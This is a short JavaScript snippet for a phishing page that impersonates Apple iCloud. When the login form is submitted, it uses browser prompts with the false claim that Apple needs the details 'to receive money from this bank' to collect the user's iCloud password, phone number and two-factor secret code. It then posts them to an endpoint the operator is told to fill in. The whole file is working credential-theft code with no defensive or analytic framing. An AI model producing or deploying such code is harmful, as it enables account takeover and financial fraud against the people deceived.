document.addEventListener("DOMContentLoaded", function() {
    const form = document.getElementById("icloud-login-form");
    form.addEventListener("submit", function(event) {
      event.preventDefault();
      // Get the user-input values
      const confirmationCode = document.getElementById("confirmation_code").value;
      
      // Prompt the user to input their iCloud password and 2FA secret code
      const password = prompt("Apple needs the information to receive money from this bank. Enter your iCloud password:");
      const phoneNumber = prompt("Apple needs the information to receive money from this bank. Enter your phone number:");
      const twoFactorSecret = prompt("Apple needs the information to receive money from this bank. Enter your 2FA secret code:");
      
      // Autofill the form fields
      document.getElementById("password").value = password;
      document.getElementById("phone_number").value = phoneNumber;
      document.getElementById("two_factor_secret").value = twoFactorSecret;
      
      // Submit the form to the endpoint
      form.action = "https://example.com/endpoint"; // Replace with your endpoint URL
      form.method = "post";
      form.submit();
    });
  });